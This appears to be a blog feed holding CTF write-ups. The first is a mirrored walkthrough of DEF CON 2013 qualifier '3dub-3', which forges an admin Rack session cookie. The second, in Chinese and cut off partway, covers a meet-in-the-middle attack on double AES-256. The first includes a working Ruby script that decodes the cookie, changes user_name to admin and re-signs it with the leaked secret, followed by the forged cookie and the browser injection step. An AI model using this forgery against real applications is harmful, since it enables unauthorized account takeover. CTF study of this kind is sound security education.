    <content type="html"><![CDATA[<p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>

<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>

<blockquote><p>Secrets</p>

<p>name owner actions</p>

<p>key admin <a href="#">show</a></p>

<p>nothing asdf <a href="#">show</a></p>

<p><a href="#">new secret</a></p></blockquote>

<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>

<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>

<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">redirect</span> <span class="s1">&#39;/secrets&#39;</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">get</span> <span class="s1">&#39;/secrets/:id&#39;</span> <span class="k">do</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">SECRETS</span><span class="o">[</span><span class="n">params</span><span class="o">[</span><span class="ss">:id</span><span class="o">].</span><span class="n">to_i</span><span class="o">]</span>
</span><span class='line'><span class="k">raise</span> <span class="s2">&quot;unauthorized&quot;</span> <span class="k">if</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">username</span>
</span><span class='line'>
</span><span class='line'><span class="n">haml</span> <span class="ss">:secret</span><span class="p">,</span> <span class="ss">locals</span><span class="p">:</span> <span class="p">{</span><span class="ss">secret</span><span class="p">:</span> <span class="n">s</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">helpers</span> <span class="k">do</span>
</span><span class='line'><span class="k">def</span> <span class="nf">current_user</span>
</span><span class='line'>    <span class="k">return</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>




<!-- more -->


<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>

<ul>
<li>rack.session</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>rack.session.options</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="ss">:path</span><span class="o">=&gt;</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="ss">:domain</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:expire_after</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:secure</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:httponly</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">,</span> <span class="ss">:defer</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:renew</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:sidbits</span><span class="o">=&gt;</span><span class="mi">128</span><span class="p">,</span> <span class="ss">:secure_random</span><span class="o">=&gt;</span><span class="no">SecureRandom</span><span class="p">,</span> <span class="ss">:secret</span><span class="o">=&gt;</span><span class="s2">&quot;wroashsoxDiculReejLykUssyifabEdGhovHabno&quot;</span><span class="p">,</span> <span class="ss">:coder</span><span class="o">=&gt;</span><span class="c1">#}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>rack.session.unpacked_cookie_data</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>rack.request.cookie_hash</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;rack.session&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj</span><span class="se">\n</span><span class="s2">YjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki</span><span class="se">\n</span><span class="s2">DXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm</span><span class="se">\n</span><span class="s2">OWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND</span><span class="se">\n</span><span class="s2">RVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj</span><span class="se">\n</span><span class="s2">OGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0</span><span class="se">\n</span><span class="s2">YWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG</span><span class="se">\n</span><span class="s2">OwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx</span><span class="se">\n</span><span class="s2">YWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl</span><span class="se">\n</span><span class="s2">c3QGOwBU</span><span class="se">\n</span><span class="s2">--d637305e23d6693f3ebe276b292293c7ff0b72e6&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>we&rsquo;ve got some message:</p>

<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>

<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="vi">@secrets</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="ss">:secret</span><span class="p">,</span> <span class="ss">:_old_secret</span><span class="p">)</span><span class="o">.</span><span class="n">compact</span>
</span><span class='line'><span class="c1"># some code else</span>
</span><span class='line'><span class="n">session_data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'>    <span class="n">session_data</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;--</span><span class="si">#{</span><span class="n">generate_hmac</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="c1"># some code else</span>
</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">session_data</span>
</span><span class='line'>    <span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span> <span class="o">=</span> <span class="n">session_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">session_data</span> <span class="o">=</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">digest_match?</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>

<ul>
<li><code>unpack(decode)</code> the cookie to origin session data</li>
<li>modify session_data.user_name to <code>admin</code></li>
<li><code>repack(encode)</code> the session data to cookie string format</li>
<li>calculate a new digest of the session data then build the cookie</li>
</ul>


<h3>code</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
</span><span class='line'><span class="c1">#Author: xelz@blue-lotus</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># part of rack/lib/rack/session/cookie.rb</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Base64</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'>        <span class="o">[</span><span class="n">str</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'>        <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># Encode session cookies as Marshaled Base64 data</span>
</span><span class='line'>    <span class="k">class</span> <span class="nc">Marshal</span> <span class="o">&lt;</span> <span class="no">Base64</span>
</span><span class='line'>        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'>            <span class="k">super</span><span class="p">(</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">str</span><span class="p">))</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="k">unless</span> <span class="n">str</span>
</span><span class='line'>            <span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="k">super</span><span class="p">(</span><span class="n">str</span><span class="p">))</span> <span class="k">rescue</span> <span class="kp">nil</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">exit</span><span class="p">()</span> <span class="k">unless</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;--&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="c1"># puts &#39;data is:&#39;</span>
</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">coder</span> <span class="o">=</span> <span class="no">Base64</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span><span class="o">[</span><span class="s1">&#39;user_name&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="c1"># puts &#39;modified data is:&#39;</span>
</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;wroashsoxDiculReejLykUssyifabEdGhovHabno&#39;</span>
</span><span class='line'><span class="c1"># puts &#39;new digest string is:&#39;</span>
</span><span class='line'><span class="n">digest</span> <span class="o">=</span> <span class="n">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
</span><span class='line'><span class="c1"># puts digest, &quot;\n&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;cookie is&#39;</span>
</span><span class='line'><span class="n">cookie</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;%0A&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;--&#39;</span> <span class="o">+</span> <span class="n">digest</span>
</span><span class='line'><span class="nb">puts</span> <span class="n">cookie</span>
</span></code></pre></td></tr></table></div></figure>


<p>run the script like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>xelz@blue-lotus:defconctf<span class="nv">$echo</span> -en <span class="s1">&#39;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1&quot;\\&quot;}&#39;</span> <span class="p">|</span> xargs ./hypeman.rb
</span><span class='line'>cookie is
</span><span class='line'>BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4<span class="o">=</span>%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
</span></code></pre></td></tr></table></div></figure>


<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;rack.session=xxx;&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>refresh the page, and enjoy :)</p>

<h3>key</h3>

<blockquote><p>watch out for this Etdeksogav</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BkP-CTF 2013 MITM]]></title>
    <link href="http://xelz.info/blog/2013/06/12/bkp-ctf-2013-mitm/"/>
    <updated>2013-06-12T19:27:34+00:00</updated>
    <id>http://xelz.info/blog/2013/06/12/bkp-ctf-2013-mitm</id>
    <content type="html"><![CDATA[<p>前两天BkP的CTF练习赛中的一道题，crypto 200，题目如下</p>

<blockquote><p>message 1: QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=</p>

<p>encrypted: THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=</p>

<p>message 2: RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=</p>

<p>encrypted: 01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=</p>

<p>ciphertext: s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=</p></blockquote>

<p>看到最后的等号首先就想到了base64编码，decode之后得到</p>

<blockquote><p>message1: AES-256 ECB mode twice, two keys</p>

<p>message2: Each key zero until last 24 bits</p>

<p>两轮AES-256加密，padding=ECB，key不一样，但是前面都是0x00，只有最后24位需要破解</p>

<p>密文都是2进制不可读，不贴了</p></blockquote>

<p>题目提示了是256位(32字节的key)，前29个字节都是0，需要破解两个key的后3个字节，纯暴力方式需要尝试2<sup>24</sup> * 2<sup>24</sup> = 2<sup>48</sup> ≈ 2.81e14种可能，这么大的计算量，显然是不现实的。</p>

<!-- more -->


<p>暴力破解，估计要用到hadoop集群了。</p>

<p>其实，当时忽略了一个细节，就是题目：MITM，google一下出来的都是Man-in-the-middle Attack（中间人攻击），似乎跟这个题目半毛钱关系都没有，换用wikipedia得到了我们想要的东西：</p>

<ul>
<li>Man-in-the-middle attack, a computer networking attack method</li>
<li>Meet-in-the-middle attack, a cryptographic attack method</li>
</ul>


<p>很显然，Meet-in-the-middle attack应该就是我们想找的东西了</p>

<blockquote><p>Assume the attacker knows a set of plaintext P and ciphertext C that satisfies the following:</p>

<ul>
<li>C=ENCk2(ENCk1(P))</li>
<li>P=DECk1(DECk2&copy;</li>
</ul>


<p>where ENC is the encryption function, DEC the decryption function defined as ENC-1 (inverse mapping) and k1 and k2 are two keys.</p>

<p>The attacker can then compute ENCk1(P) for all possible keys k1. Afterwards he can decrypt the ciphertext by computing DECk2&copy; for each k2. Any matches between these two resulting sets are likely to reveal the correct keys. (To speed up the comparison, the ENCk1(P) set can be stored in an in-memory lookup table, then each DECk2&copy; can be matched against the values in the lookup table to find the candidate keys)</p></blockquote>

<p>这个模型跟题目所设的是完全一样的，思路给的很清楚了，先穷举key1，计算出明文经过所有可能的key1加密后的结果，将结果存于内存中，然后穷举key2，计算密文经过key2解密后的结果，与内存中的结果集进行比对（因为AES是对称加密，加密跟解密是用的相同的key），如果有一致的，就表明破解成功了，这样算起来，时间复杂度只有2<sup>24</sup> + 2<sup>24</sup> = 2<sup>25</sup></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c">#! -*- coding: utf-8 -*-</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">aes_encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
</span><span class='line'>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">ciphertext</span>
</span><span class='line'>
